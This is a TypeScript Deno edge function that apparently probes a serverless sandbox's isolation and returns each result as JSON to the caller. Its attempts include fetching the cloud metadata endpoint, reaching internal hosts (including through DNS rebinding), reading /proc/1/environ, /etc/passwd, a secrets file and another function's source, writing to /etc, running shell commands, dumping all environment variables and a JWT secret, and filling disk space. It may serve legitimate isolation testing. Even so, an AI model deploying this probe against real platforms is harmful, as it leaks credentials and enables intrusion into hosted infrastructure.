const out: Record<string, string> = {};
async function t(label: string, f: () => Promise<unknown> | unknown) {
  try { const v = await f(); out[label] = 'OK ' + String(v).slice(0, 120); } catch (e) { out[label] = 'DENIED ' + String(e).slice(0, 120); }
}
const timeout = () => AbortSignal.timeout(2500);
Deno.serve(async (req) => {
  const host = new URL(req.url).searchParams.get('host') ?? '172.17.0.1';
  await t('fetch_example_com', async () => (await fetch('https://example.com', { signal: timeout() })).status);
  await t('fetch_metadata_169', async () => (await fetch('http://169.254.169.254/', { signal: timeout() })).status);
  const port = new URL(req.url).searchParams.get('port') ?? '8443';
  const reach = async (u: string) => { try { const r = await fetch(u, { signal: timeout() }); return 'HTTP ' + r.status; } catch (e) { const m = String(e); if (m.includes('NotCapable')) throw e; return 'REACHED-OR-FAILED ' + m.slice(-170); } };
  await t('host_gateway_ip', () => reach(`http://${host}:${port}/`));
  await t('host_via_dns_rebind', () => reach(`http://${host}.sslip.io:${port}/`));
  await t('rfc1918_10', () => reach(`http://10.255.255.1:80/`));
  await t('loopback_9000_main', () => reach(`http://127.0.0.1:9000/_sb/x`));
  await t('fetch_file_proc_environ', async () => (await (await fetch('file:///proc/1/environ')).text()).length);
  await t('read_proc_environ', () => Deno.readTextFile('/proc/1/environ').then((s) => s.length));
  await t('read_run_secrets', () => Deno.readTextFile('/run/sbarbase/secrets.json'));
  await t('read_other_function', () => Deno.readTextFile('/home/deno/functions/other/index.ts'));
  await t('read_etc_passwd', () => Deno.readTextFile('/etc/passwd').then((s) => s.length));
  await t('write_etc', () => Deno.writeTextFile('/etc/pwned', 'x'));
  await t('write_tmp_small', () => Deno.writeTextFile('/tmp/a', 'x'));
  await t('deno_command', () => new Deno.Command('id').outputSync());
  await t('node_child_process', async () => { const cp = await import('node:child_process'); return cp.execSync('id').toString(); });
  await t('env_sb_jwt', () => Deno.env.get('SB_JWT_SECRET') ?? 'undefined');
  await t('env_all', () => JSON.stringify(Deno.env.toObject()));
  await t('tmp_fill_200mb', async () => {
    const chunk = new Uint8Array(1024 * 1024); const f = await Deno.open('/tmp/big', { write: true, create: true });
    let n = 0; try { for (; n < 200; n++) await f.write(chunk); } finally { f.close(); } return n + ' MiB written';
  });
  return Response.json(out);
});
